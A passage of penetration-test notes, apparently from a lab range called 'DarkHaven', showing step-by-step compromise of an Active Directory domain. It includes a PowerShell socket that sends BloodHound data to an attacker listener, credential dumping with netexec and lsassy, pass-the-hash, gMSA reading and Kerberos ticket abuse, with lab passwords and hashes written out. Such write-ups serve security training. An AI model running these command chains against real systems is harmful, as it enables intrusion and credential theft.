2026-04-10T08:55:42.4847517+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:42.5948813+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:42.6289194+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:42.7407518+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:42.7647367+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:42.9251608+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.4578855+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.4598951+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.5726699+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.6080448+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.6988437+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.7383457+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.8257234+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.8616761+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.9617869+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:43.9967746+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.0845043+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.1219450+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.2105772+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.2449026+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.3357878+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.3732246+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.3768586+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.4981382+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.5605601+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.5971328+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.6524100+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.7525098+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.8415280+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.8432843+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:44.9138961+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.0074122+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.0442851+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.1070673+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.1625570+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.2643553+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.3006587+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.3398901+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.4372482+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL
2026-04-10T08:55:45.5058317+00:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for EXT.DARKHAVEN.LOCAL

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2048.png)

***Transferring Bloodhound loot***

```bash
#Kali
nc -lvnp 5555 > BloodHound.zip

#Windows
$client = New-Object System.Net.Sockets.TCPClient("192.168.211.2",5555)
$stream = $client.GetStream()
$bytes = [System.IO.File]::ReadAllBytes("C:\Users\Administrator\Desktop\20260410085541_BloodHound.zip")
$stream.Write($bytes,0,$bytes.Length)
$stream.Close()
$client.Close()
```

```bash
nxc rdp scope.txt -u 'svc_webpool' -p 'D@rkH@v3n128!' 
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2049.png)

- `svc_webpool` has rdp access to
    
    ```bash
    10.10.10.132 web.ext.darkhaven.local
    10.10.10.134 ca.ext.darkhaven.local
    
    #Compromised
    10.10.10.133 sql.ext.darkhaven.local
    10.10.10.135 share.ext.darkhaven.local
    
    nxc rdp scope.txt -u 'svc_webpool' -p 'D@rkH@v3n128!' --local-auth
    
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2050.png)
    
    - We have Allow log on through Remote Desktop Services access on `10.10.10.132 web.ext.darkhaven.local`
    - The `STATUS_LOGON_FAILURE` on the others just means that while the password is correct, that account doesn't have the specific "Allow log on through Remote Desktop Services" right on those servers.
    
    ```bash
    xfreerdp3 /u:svc_webpool /p:'D@rkH@v3n128!' /v:10.10.10.132 /drive:$(pwd),share +clipboard /dynamic-resolution
    ```
    

## ***Web.ext.darkhaven.local - Continuation***

```bash
xfreerdp3 /u:svc_webpool /p:'D@rkH@v3n128!' /v:10.10.10.132 /drive:$(pwd),share +clipboard /dynamic-resolution
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2051.png)

- Notepad ++ was left open

### ***Web.ext.darkhaven.local - root flag***

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2052.png)

#### ***Web.ext.darkhaven.local  - Post exploitation***

- Lets perform credential harvesting
- Notepad ++ is mostly likely our way forward since upon connecting to rdp, the notepad ++ was  open
    
    ```bash
    netexec smb 10.10.10.132 --local-auth -u svc_webpool -p 'D@rkH@v3n128!' --lsa
    nxc smb 10.10.10.132 -u svc_webpool -p 'D@rkH@v3n128!' --local-auth -M lsassy
    nxc ldap scope.txt --local-auth -u svc_webpool -p 'D@rkH@v3n128!'  --groups
    
    netexec smb 10.10.10.132 --local-auth -u svc_webpool -p 'D@rkH@v3n128!' --sam
    
    #Hunting for passwords in PowerShell Histories
    nxc smb10.10.10.132 --local-auth -u svc_webpool -p 'D@rkH@v3n128!' -M powershell_history -o export=True
    
    Get-ChildItem -Path C:\Users\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue | foreach { 
        Write-Host "`n--- Checking History for: $($_.FullName) ---" -ForegroundColor Cyan
        Select-String -Path $_.FullName -Pattern "pass", "user", "net ", "svc", "admin"
    }
    
    #Inveigh( Windows machine)
    
    #Notepad ++
    nxc smb 10.10.10.132 -u svc_webpool -p 'D@rkH@v3n128!' -M notepad++ --local-auth 
    
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2053.png)
    
    - successfully dumped the NT hash for `svc_webpool` from memory. While we already had the cleartext password for this account, having the hash confirms that the `lsassy` module is working perfectly on this target.
    - The fact that *only* `svc_webpool` showed up in the LSASS dump suggests that no other users (like a Domain Admin) have an active session on this ***Web.ext.darkhaven.local***  instance right now.
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2054.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2055.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2056.png)
    
    - Critical  Hardcoded Domain Credentials were  obtained
        
        ```bash
        define('ca_auth_user',  'darkhaven\\kwarren');
        define('ca_auth_pass',  '!@#darkhav3n123#@!');
        ```
        
    - Discovered **** `kwarren` user that is a **domain account used for** Certificate Authority (CA) authentication

***Test the new credentials***

```bash
nxc smb 10.10.10.134 -u kwarren -p '!@#darkhav3n123#@!' -d ext.darkhaven.local
nxc smb scope.txt -u kwarren -p '!@#darkhav3n123#@!' -d ext.darkhaven.local
nxc ldap scope.txt -u kwarren -p '!@#darkhav3n123#@!' --groups
nxc smb scope.txt -u kwarren -p '!@#darkhav3n123#@!' --shares

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2057.png)

- Kwarren can authenticate to CA,DC,WEB,SHARE
- We already compromised WEB,SHARE so we are left with CA, DC

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2058.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2059.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2060.png)

- A **gMSA (Group Managed Service Account)**:
    - Has a **rotating password stored in AD**
    - Can be retrieved by members of an allowed group
    - Often used for services like ADCS / SQL / IIS
- `ca_svc_account` is likely tied to **Certificate Services (ADCS)**

#### Check if **kwarren can read the gMSA password**

```bash
nxc ldap 10.10.10.136 -u kwarren -p '!@#darkhav3n123#@!' --gmsa
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2061.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2062.png)

- Bloodhound data confirming the gmsa

# Enumerating ***ca***.ext.darkhaven.local

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.134

PORT     STATE SERVICE       REASON          VERSION
80/tcp   open  http          syn-ack ttl 127 Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
| rdp-ntlm-info: 
|   Target_Name: DARKHAVEN
|   NetBIOS_Domain_Name: DARKHAVEN
|   NetBIOS_Computer_Name: CA
|   DNS_Domain_Name: ext.darkhaven.local
|   DNS_Computer_Name: ca.ext.darkhaven.local
|   DNS_Tree_Name: ext.darkhaven.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-10T07:04:26+00:00
| ssl-cert: Subject: commonName=ca.ext.darkhaven.local
| Issuer: commonName=ca.ext.darkhaven.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-28T02:07:17
| Not valid after:  2026-08-30T02:07:17
| MD5:     e790 e2f3 b37a 1e0e 9ced 4289 ddb9 008a
| SHA-1:   d331 34f1 15a7 9ebe b8ae 8c5a 07ac d7a3 7a0f 3543
| SHA-256: 6680 7a2f ed13 44c0 ff8a ac87 46c3 a6c1 82cf 8afa 905a ab19 a266 4dcb 3fc6 d14d

|_ssl-date: TLS randomness does not represent time
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/10%Time=69D8A0F0%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

### Verifying creds

```bash
nxc smb 10.10.10.136 -u ca_svc_account$ -H 3ab7add8db852831e7299c61ba35e2d2 
nxc smb 10.10.10.136 -u ca_svc_account$ -H 3ab7add8db852831e7299c61ba35e2d2 --shares
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --shares
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2063.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2064.png)

- `ca_svc_account$` is a local administrator on the Certificate Authority machine (`10.10.10.134`)
- Since `ca_svc_account$` is a admin on `10.10.10.134`, use `nxc` to dump the local SAM and LSA secrets.
    
    ```bash
    nxc smb 10.10.10.134 -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --sam
    nxc smb 10.10.10.134 -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' --lsa
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2065.png)
    
    - local admin hash was obtained
    - Domain cached credential (DCC2) obtained but hard to crack

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2066.png)

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2067.png)

- we looked into bloodhound to check if there is anything interesting

#### Pass-the-Hash with CA$ on DC

```bash
nxc smb 10.10.10.136 -u 'CA$' -H 7d3da6e6fe6bb8872de16df8186a7e44
impacket-psexec ext.darkhaven.local/CA$@10.10.10.136 -hashes :7d3da6e6fe6bb8872de16df8186a7e44
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2068.png)

#### Connecting to Evil-winrm

```bash
evil-winrm -i ca.ext.darkhaven.local -u 'Administrator' -H 7af69f428fd21312a225c74e5f574ed6
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2069.png)

#### ***ca.ext.darkhaven.local  - Post exploitation***

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2070.png)

- We do have a user `ichambers` with directories of ichambers\AppData\Roaming which immediately tells us about Local file hunting
- looking into **Browser Data:** Look for `Mozilla\Firefox` or `Google\Chrome`. You can exfiltrate the `Login Data` or `key4.db` files and crack them locally.
- **Microsoft Vault/Credentials:** Check for `Microsoft\Credentials` or `Microsoft\Vault`.

#### Credential hunting

#Using the same commands from above. The most fitting one is powershell history

```bash
netexec ca.ext.darkhaven.local -u 'Administrator' -H 7af69f428fd21312a225c74e5f574ed6 --lsa
nxc smb ca.ext.darkhaven.local -u 'Administrator' -H 7af69f428fd21312a225c74e5f574ed6 -M lsassy
nxc ldap scope.txt --local-auth -u svc_webpool -p 'D@rkH@v3n128!'  --groups

netexec smb 10.10.10.132 --local-auth -u svc_webpool -p 'D@rkH@v3n128!' --sam

#Hunting for passwords in PowerShell Histories
nxc smb ca.ext.darkhaven.local -u 'ca_svc_account$' -H '3ab7add8db852831e7299c61ba35e2d2' -M powershell_history -o export=True

Get-ChildItem -Path C:\Users\ -Filter ConsoleHost_history.txt -Recurse -ErrorAction SilentlyContinue | foreach { 
    Write-Host "`n--- Checking History for: $($_.FullName) ---" -ForegroundColor Cyan
    Select-String -Path $_.FullName -Pattern "pass", "user", "net ", "svc", "admin"
}

#Inveigh( Windows machine)

#Notepad ++
nxc smb 10.10.10.132 -u svc_webpool -p 'D@rkH@v3n128!' -M notepad++ --local-auth 

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2071.png)

- Credentials Found  used to map a drive to `\\dc01\share`
    
    ```bash
    ldap_svc:6trfgvb**hs#@jskKFHJAh34
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2072.png)
    

***Verifying creds***

```bash
nxc smb scope -u ldap_svc -p '6trfgvb**hs#@jskKFHJAh34' --smb-timeout 30
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2073.png)

- STATUS_ACCOUNT_RESTRICTION means this is NOT a wrong password but the account **IS VALID but restricted for SMB logon**
- That then means t**rying a `different aunthentication protocol`** If SMB is restricted, maybe `LDAP` or `WinRM` is not then `Kerberos`.
- To understand the difference, it helps to think of **Kerberos** as the entire security system of a building, and **Kerberoasting** as a specific trick to steal a key from that system and take it home to copy it.

***1. Kerberos: The Security System***

**Kerberos** is the default authentication protocol used in Active Directory. Its job is to prove that a user is who they say they are without sending passwords over the network in cleartext.

It uses a system of **Tickets**:

- **TGT (Ticket Granting Ticket):** Think of this as your "ID Badge" for the day. You get this when you first log in.
- **TGS (Service Ticket):** Think of this as a "Single-Use Key." When you want to access a specific resource (like a file share or a database), you show your ID Badge (TGT) to the Domain Controller, and it gives you a TGS for that specific service.

**The Key Detail:** To ensure only the correct service can read your ticket, the Domain Controller encrypts the TGS using the **password hash of the service account**.

***2. Kerberoasting: The Attack***

**Kerberoasting** is a post-exploitation technique where an attacker, already having a foothold in the network, requests a TGS for a service and then "roasts" (cracks) it offline.

*How it works:*

1. **Request:** Any authenticated user (even a low-privilege one) can ask the Domain Controller for a TGS for any account that has a **Service Principal Name (SPN)**.
2. **Receive:** The Domain Controller sends the ticket back. Remember, this ticket is encrypted with the service account's password hash.
3. **Exfiltrate:** The attacker pulls that encrypted ticket out of their computer's memory.
4. **Crack:** Because the encryption uses the service's password as the key, the attacker can use a tool like **Hashcat** to guess the password millions of times per second until they find the one that "unlocks" the ticket.
    
    ```bash
    nxc ldap dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' --asreproast
    nxc winrm dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34'
    
    #Kerberos
    nxc smb dc.ext.darkhaven.local --generate-krb5-file darkhaven.krb 
    cat darkhaven.krb 
    nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k
    
    export KRB5_CONFIG=$(pwd)/darkhaven.krb
    echo $KRB5_CONFIG
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2074.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2075.png)
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2076.png)
    

# Enumerating ***dc***.ext.darkhaven.local

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.136

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-10 16:31:46Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ext.darkhaven.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: ext.darkhaven.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| rdp-ntlm-info: 
|   Target_Name: DARKHAVEN
|   NetBIOS_Domain_Name: DARKHAVEN
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: ext.darkhaven.local
|   DNS_Computer_Name: DC.ext.darkhaven.local
|   DNS_Tree_Name: ext.darkhaven.local
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-10T16:32:01+00:00
| ssl-cert: Subject: commonName=DC.ext.darkhaven.local
| Issuer: commonName=DC.ext.darkhaven.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-02-26T00:36:13
| Not valid after:  2026-08-28T00:36:13
| MD5:     bc4e 0562 adc6 3f55 5d5e 1f3f a8c3 f0b1
| SHA-1:   43a9 0522 81db 79fa f38e 96a6 904a 6a83 09a4 ba6b
| SHA-256: cb75 961b feb0 877e b7b8 20a9 45e5 9c94 1a23 81a6 510c 7c05 482e 9ea8 cdbf 4d8f

5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/10%Time=69D925F6%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2077.png)

- `ldap_svc` is a member of domain admins
    
    ```bash
    nxc smb dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -k
    evil-winrm -i dc.ext.darkhaven.local -u 'ldap_svc' -p '6trfgvb**hs#@jskKFHJAh34' -r 'EXT.DARKHAVEN.LOCAL'
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2078.png)
    
    - `evil-winrm` is trying to find a pre-existing ticket in our local Kerberos cache
    - let’s manually grab the **TGT (Ticket Granting Ticket)** and feed it to the shell
        
        ```bash
        impacket-getTGT -dc-ip 10.10.10.136 ext.darkhaven.local/ldap_svc:'6trfgvb**hs#@jskKFHJAh34'
        export KRB5CCNAME=$(pwd)/ldap_svc.ccache
        evil-winrm -i dc.ext.darkhaven.local -r 'EXT.DARKHAVEN.LOCAL' -K ldap_svc.ccache
        ```
        
        ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2079.png)
        

#### dc- ROOT Flag

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2080.png)

#### ***dc.ext.darkhaven.local  - Post exploitation***

```bash
*Evil-WinRM* PS C:\Users> cd Administrator\Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> ls

    Directory: C:\Users\Administrator\Desktop

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----        11/14/2024   1:03 AM            470 EC2 Feedback.url
-a----        11/14/2024   1:03 AM            501 EC2 Microsoft Windows Guide.url
-a----          3/3/2026  12:53 PM         266031 ldap_sync.exe
-a----         2/27/2026  12:28 AM           2355 Microsoft Edge.lnk
-a----          3/7/2026   2:18 AM             82 root.txt

*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```

- ldap_sync.exe is interesting, we need to download it and examine it

***Check File Type and Metadata***

```bash
file ldap_sync.exe
exiftool ldap_sync.exe
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2081.png)

***Extract Strings***

- Look for hardcoded passwords, IP addresses, LDAP paths (`LDAP://...`), or SQL connection strings.
    
    ```bash
    strings ldap_sync.exe | grep -iE -B 10 -A 5 "ldap|password|svc|http|db"
    ```
    
    ![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2082.png)
    
    - obtained a simple password leak and found the **sync logic** and a **secondary domain target**.
    - Notice these two lines:
        - `DC=ext,DC=darkhaven,DC=local` (The current domain)
        - **`DC=darkhaven,DC=tech`** (A NEW domain)
    - This confirms that `ldap_sync.exe` isn't just a local tool; it is a **cross-domain synchronization utility**. It likely pulls objects from `ext.darkhaven.local` and pushes them to (or compares them with) `darkhaven.tech`.
    
    ```bash
    ldap_svc:D@rkhav3nLDAP2024!
    
    ```
    

#### Verifying creds

```bash
nxc smb dc.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!' 
nxc smb scope.txt -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!' 
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2083.png)

- Creds are valid for `dc02.corp.darkhaven.tech`

# Enumerating ***dc02.corp***.darkhaven.tech

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.5

PORT     STATE SERVICE       REASON          VERSION
53/tcp   open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp   open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-10 17:23:38Z)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkhaven.tech, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds? syn-ack ttl 127
464/tcp  open  kpasswd5?     syn-ack ttl 127
593/tcp  open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped    syn-ack ttl 127
3268/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkhaven.tech, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped    syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=EC2AMAZ-KK0CT8N.corp.darkhaven.tech
| Issuer: commonName=EC2AMAZ-KK0CT8N.corp.darkhaven.tech
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-06T01:56:58
| Not valid after:  2026-09-05T01:56:58
| MD5:     456e 1504 e0e9 faeb d093 264b 704c 512a
| SHA-1:   cfff 813e a485 796f 27b8 783a e7c8 4ea8 d880 90f4
| SHA-256: 9f5f b7c5 520b d3ef cf45 5c32 a955 473a 0537 98e8 660b fa2b b990 7c13 d1de e3e7

```

#### Connecting to winrm

```bash
nxc smb scope.txt -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!' 
evil-winrm -i dc02.corp.darkhaven.tech -u 'ldap_svc' -p 'D@rkhav3nLDAP2024!'
```

![image.png](Range%20DarkHaven-%20Range%20DarkHaven/image%2084.png)

# Enumerating ***dc***.darkhaven.local

```bash
sudo nmap -sC -sV -vv -Pn 10.10.10.4

PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-04-10 18:23:01Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkhaven.tech, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: darkhaven.tech, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
3389/tcp  open  ms-wbt-server syn-ack ttl 127
| rdp-ntlm-info: 
|   Target_Name: DARKHAVEN
|   NetBIOS_Domain_Name: DARKHAVEN
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: darkhaven.tech
|   DNS_Computer_Name: dc.darkhaven.tech
|   DNS_Tree_Name: darkhaven.tech
|   Product_Version: 10.0.26100
|_  System_Time: 2026-04-10T18:23:59+00:00
| ssl-cert: Subject: commonName=dc.darkhaven.tech
| Issuer: commonName=dc.darkhaven.tech
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-03-06T00:09:06
| Not valid after:  2026-09-05T00:09:06
| MD5:     4d67 ed4d d788 a6cf 0809 36ff 302e 1666
| SHA-1:   bd57 e3d8 ac81 2877 f119 e688 2692 efb8 687b 4a91
| SHA-256: 34cf e896 e3ea 3959 118c 5398 2348 e5a0 1aab d105 9314 40cb 62b3 8d2a adae 53b2

5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
50001/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3389-TCP:V=7.98%I=7%D=4/10%Time=69D9400B%P=x86_64-pc-linux-gnu%r(Te
SF:rminalServerCookie,13,"\x03\0\0\x13\x0e\xd0\0\0\x124\0\x02\?\x08\0\x02\
SF:0\0\0");
